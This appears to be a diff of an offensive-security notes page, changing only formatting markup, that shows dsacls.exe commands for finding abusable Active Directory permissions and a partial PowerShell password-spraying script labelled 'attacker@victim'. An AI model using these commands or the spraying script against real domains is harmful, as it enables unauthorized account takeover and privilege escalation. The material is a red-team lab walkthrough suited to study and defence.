@@ -12,13 +12,11 @@ Dsacls allows us to display or modify permissions \(ACLS\) of an Active Director
 
 Let's check if user `spot` has any special permissions against user's `spotless` AD object:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Nothing useful:
 
@@ -30,13 +28,11 @@ Let's give user spot `Reset Password` and `Change Password` permissions on `spot
 
 ...and try the command again:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-19-22-44-21.png)
 
@@ -44,25 +40,21 @@ dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
 
 All well known \(and abusable\) AD object permissions should be sought here. One of them is `FULL CONTROL`:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "full control"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-19-22-54-36.png)
 
 ### Add/Remove self as member
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" | select-string "spotless"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-19-22-57-50.png)
 
@@ -82,30 +74,25 @@ For more good privileges to be abused:
 
 As a side note, the `dsacls` binary could be used to do LDAP password spraying as it allows us to bind to an LDAP session with a specified username and password:
 
-{% tabs %}
-{% tab title="incorrect logon" %}
+{% code title="incorrect logon" %}
 ```csharp
 dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:spotless@offense.local /passwd:1234567
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![Logon Failure](../../.gitbook/assets/screenshot-from-2019-03-19-23-09-12.png)
 
-{% tabs %}
-{% tab title="correct logon" %}
+{% code title="correct logon" %}
 ```csharp
 dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:spotless@offense.local /passwd:123456
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![Logon Successful](../../.gitbook/assets/screenshot-from-2019-03-19-23-09-59.png)
 
 ### Dirty POC idea for Password Spraying:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 $domain = ((cmd /c set u)[-3] -split "=")[-1]
 $pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
@@ -125,8 +112,7 @@ $password = "123456"
     }
 }
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-20-00-10-10.png)
 
